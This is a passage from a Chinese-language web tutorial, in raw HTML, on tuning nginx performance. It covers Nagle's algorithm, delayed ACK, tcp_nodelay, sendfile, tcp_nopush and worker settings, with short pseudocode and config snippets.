MSS）的处理。只针对比 MSS 小的包，只有当接收方成功地将以前的包(ACK)的所有确认发送回来时，这些包才会被发送。在等待期间，发送方可以缓冲更多的数据之后再发送。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d2fd933464656\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif package.size &gt;= MSS.size\r\n  send(package)\r\nelsif acks.all_received?\r\n  send(package)\r\nelse\r\n  # acumulate data\r\nend</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d2fd933464656-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d2fd933464656-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d2fd933464656-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d2fd933464656-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d2fd933464656-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d2fd933464656-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d2fd933464656-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d2fd933464656-1\"><span class=\"crayon-st\">if</span> <span class=\"crayon-t\">package</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">size</span> <span class=\"crayon-o\">&gt;=</span> <span class=\"crayon-v\">MSS</span><span class=\"crayon-sy\">.</span><span class=\"crayon-i\">size</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d2fd933464656-2\">  <span class=\"crayon-e\">send</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">package</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d2fd933464656-3\"><span class=\"crayon-i\">elsif</span> <span class=\"crayon-v\">acks</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">all_received</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d2fd933464656-4\">  <span class=\"crayon-e\">send</span><span class=\"crayon-sy\">(</span><span class=\"crayon-t\">package</span><span class=\"crayon-sy\">)</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d2fd933464656-5\"><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d2fd933464656-6\">  <span class=\"crayon-p\"># acumulate data</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d2fd933464656-7\"><span class=\"crayon-st\">end</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0010 seconds] -->\r\n<p>与此同时，诞生了另一个理论，延时 ACK</p>\n<p>在 TCP 通讯中，在发送数据后，需要接收回应包(ACK)来确认数据被成功传达。</p>\n<p>延时 ACK 旨在解决线路被大量的 ACK 包拥堵的状况。为了减少 ACK 包的数量，接收者等待需要回传的数据加上 ACK 包回传给发送方，如果没有数据需要回传，必须在至少每 2 个 MSS，或每 200 至 500 毫秒内发送 ACK（以防我们不再收到包）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d308438243912\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nif packages.any?\r\n  send\r\nelsif last_ack_send_more_than_2MSS_ago? || 200_ms_timer.finished?\r\n  send\r\nelse\r\n  # wait\r\nend</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d308438243912-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d308438243912-2\">2</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d308438243912-3\">3</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d308438243912-4\">4</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d308438243912-5\">5</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d308438243912-6\">6</div><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d308438243912-7\">7</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d308438243912-1\"><span class=\"crayon-st\">if</span> <span class=\"crayon-v\">packages</span><span class=\"crayon-sy\">.</span><span class=\"crayon-v\">any</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d308438243912-2\">  <span class=\"crayon-e\">send</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d308438243912-3\"><span class=\"crayon-i\">elsif</span> <span class=\"crayon-v\">last_ack_send_more_than_2MSS_ago</span><span class=\"crayon-sy\">?</span> <span class=\"crayon-o\">||</span> <span class=\"crayon-cn\">200_ms_timer.finished</span><span class=\"crayon-sy\">?</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d308438243912-4\">  <span class=\"crayon-e\">send</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d308438243912-5\"><span class=\"crayon-st\">else</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d308438243912-6\">  <span class=\"crayon-p\"># wait</span></div><div class=\"crayon-line\" id=\"crayon-5a6f29791d308438243912-7\"><span class=\"crayon-st\">end</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0006 seconds] -->\r\n<p>正如你可能在一开始就注意到的那样 —— 这可能会导致在持久连接上的一些暂时的死锁。让我们重现它！</p>\n<p>假设：</p>\n<ul>\n<li>初始拥塞窗口等于 2。拥塞窗口是另一个 TCP 机制的一部分，称为慢启动。细节现在并不重要，只要记住它限制了一次可以发送多少个包。在第一次往返中，我们可以发送 2 个 MSS 包。在第二次发送中：4 个 MSS 包，第三次发送中：8 个MSS，依此类推。</li>\n<li>4 个已缓存的等待发送的数据包：A, B, C, D</li>\n<li>A, B, C是 MSS 包</li>\n<li>D 是一个小包</li>\n</ul>\n<p>场景：</p>\n<ul>\n<li>由于是初始的拥塞窗口，发送端被允许传送两个包：A 和 B</li>\n<li>接收端在成功获得这两个包之后，发送一个 ACK</li>\n<li>发件端发送 C 包。然而，Nagle 却阻止它发送 D 包（包长度太小，等待 C 的ACK）</li>\n<li>在接收端，延迟 ACK 使他无法发送 ACK（每隔 2 个包或每隔 200 毫秒发送一次）</li>\n<li>在 200ms 之后，接收器发送 C 包的 ACK</li>\n<li>发送端收到 ACK 并发送 D 包</li>\n</ul>\n<p><img src=\"http://jbcdn2.b0.upaiyun.com/2018/01/b6e17719eb44c61d243ba5ca82c37480.png\"></p>\n<p>在这个数据交换过程中，由于 Nagel 和延迟 ACK 之间的死锁，引入了 200ms 的延迟。</p>\n<p>Nagle 算法是当时真正的救世主，而且目前仍然具有<a href=\"https://news.ycombinator.com/item?id=9048947\" rel=\"nofollow\">极大的价值</a>。但在大多数情况下，我们不会在我们的网站上使用它，因此可以通过添加 TCP_NODELAY 标志来安全地关闭它。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d30d830460910\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntcp_nodelay on;     # sets TCP_NODELAY flag, used on keep-alive connections</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d30d830460910-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d30d830460910-1\"><span class=\"crayon-v\">tcp</span><span class=\"crayon-sy\">_</span>nodelay <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span>     <span class=\"crayon-p\"># sets TCP_NODELAY flag, used on keep-alive connections</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>享受这200ms提速吧！</p>\n<p>更多的细节，推荐阅读其他<a href=\"http://ccr.sigcomm.org/archive/2001/jan01/ccr-200101-mogul.pdf\" target=\"_blank\" rel=\"nofollow\">优秀的文章</a>。</p>\n<h3></h3>\n<h3><code>sendfile</code></h3>\n<p>正常来说，当要发送一个文件时需要下面的步骤：</p>\n<ul>\n<li>malloc(3) – 分配一个本地缓冲区，储存对象数据。</li>\n<li>read(2) – 检索和复制对象到本地缓冲区。</li>\n<li>write(2) – 从本地缓冲区复制对象到 socket 缓冲区。</li>\n</ul>\n<p>这涉及到两个上下文切换（读，写），并使相同对象的第二个副本成为不必要的。正如你所看到的，这不是最佳的方式。值得庆幸的是还有另一个系统调用，提升了发送文件（的效率），它被称为：<code>sendfile(2)</code>（想不到吧！居然是这名字）。这个调用在文件 cache 中检索一个对象，并传递指针（不需要复制整个对象），直接传递到 socket 描述符，Netflix 表示，使用 sendfile(2) 将网络吞吐量<a href=\"https://people.freebsd.org/~rrs/asiabsd_2015_tls.pdf\" target=\"_blank\" rel=\"nofollow\">从 6Gbps 提高到了 30Gbps</a>。</p>\n<p>然而，sendfile(2) 有一些注意事项：</p>\n<ul>\n<li>不可用于 UNIX sockets（例如：当通过你的上游服务器发送静态文件时）</li>\n<li>能否执行不同的操作，取决于操作系统（<a href=\"https://blog.phusion.nl/2015/06/04/the-brokenness-of-the-sendfile-system-call/\" target=\"_blank\" rel=\"nofollow\">这里查看更多</a>）</li>\n</ul>\n<p>在 nginx 中打开它</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d312988310229\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsendfile on;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d312988310229-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d312988310229-1\"><span class=\"crayon-i\">sendfile</span> <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p></p>\n<h3><code>tcp_nopush</code></h3>\n<p>tcp_nopush 与 tcp_nodelay 相反。不是为了尽可能快地推送数据包，它的目标是一次性优化数据的发送量。</p>\n<p>在发送给客户端之前，它将强制等待包达到最大长度(MSS)。而且这个指令只有在 sendfile 开启时才起作用。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d315702096270\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsendfile on;\r\ntcp_nopush on;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d315702096270-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5a6f29791d315702096270-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d315702096270-1\"><span class=\"crayon-i\">sendfile</span> <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5a6f29791d315702096270-2\"><span class=\"crayon-v\">tcp</span><span class=\"crayon-sy\">_</span>nopush <span class=\"crayon-v\">on</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p>看起来 tcp_nopush 和 tcp_nodelay 是互斥的。但是，如果所有 3 个指令都开启了，nginx 会：</p>\n<ul>\n<li>确保数据包在发送给客户之前是已满的</li>\n<li>对于最后一个数据包，tcp_nopush 将被删除 —— 允许 TCP 立即发送，没有 200ms 的延迟</li>\n</ul>\n<h2>我应该使用多少进程？</h2>\n<h3>工作进程</h3>\n<p>worker_process 指令会指定：应该运行多少个 worker。默认情况下，此值设置为 1。最安全的设置是通过传递 auto 选项来使用核心数量。</p>\n<p>但由于 Nginx 的架构，其处理请求的速度非常快 – 我们可能一次不会使用超过 2-4 个进程（除非你正在托管 Facebook 或在 nginx 内部执行一些 CPU 密集型的任务）。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d319850499069\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nworker_process auto;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d319850499069-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d319850499069-1\"><span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>process <span class=\"crayon-v\">auto</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p></p>\n<h3>worker 连接</h3>\n<p>与 worker_process 直接绑定的指令是 worker_connections。它指定一个工作进程可以一次打开多少个连接。这个数目包括所有连接（例如与代理服务器的连接），而不仅仅是与客户端的连接。此外，值得记住的是，一个客户端可以打开多个连接，同时获取其他资源。</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d31c397955756\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nworker_connections 1024;</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5a6f29791d31c397955756-1\">1</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5a6f29791d31c397955756-1\"><span class=\"crayon-v\">worker</span><span class=\"crayon-sy\">_</span>connections <span class=\"crayon-cn\">1024</span><span class=\"crayon-sy\">;</span></div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0005 seconds] -->\r\n<p></p>\n<h3>打开文件数目限制</h3>\n<p>在基于 Unix 系统中的“一切都是文件”。这意味着文档、目录、管道甚至套接字都是文件。系统对一个进程可以打开多少文件有一个限制。要查看该限制：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5a6f29791d320040523001\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" 